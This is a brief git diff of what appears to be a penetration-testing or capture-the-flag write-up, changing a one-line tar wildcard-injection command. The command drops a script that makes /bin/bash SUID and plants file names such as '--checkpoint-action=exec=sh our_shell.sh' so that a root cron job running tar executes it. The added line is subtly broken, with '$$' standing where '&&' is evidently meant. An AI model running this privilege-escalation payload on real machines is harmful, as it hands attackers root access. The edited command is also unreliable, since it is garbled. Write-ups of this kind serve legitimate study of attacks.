@@ -659,7 +659,7 @@ touch "/var/www/html/webdav/--checkpoint=1"
 ### One-Liner
 
 ```bash
-echo -e '#!/bin/bash\nchmod +s /bin/bash' > /var/www/html/webdav/our_shell.sh ; chmod +x /var/www/html/webdav/our_shell.sh ; touch "/var/www/html/webdav/--checkpoint-action=exec=sh our_shell.sh" ; touch "/var/www/html/webdav/--checkpoint=1"
+echo -e '#!/bin/bash\nchmod +s /bin/bash' > /var/www/html/webdav/our_shell.sh $$ chmod +x /var/www/html/webdav/our_shell.sh && touch "/var/www/html/webdav/--checkpoint-action=exec=sh our_shell.sh" && touch "/var/www/html/webdav/--checkpoint=1"
 ```
 
 Wait approximately one minute for the cron job to execute.
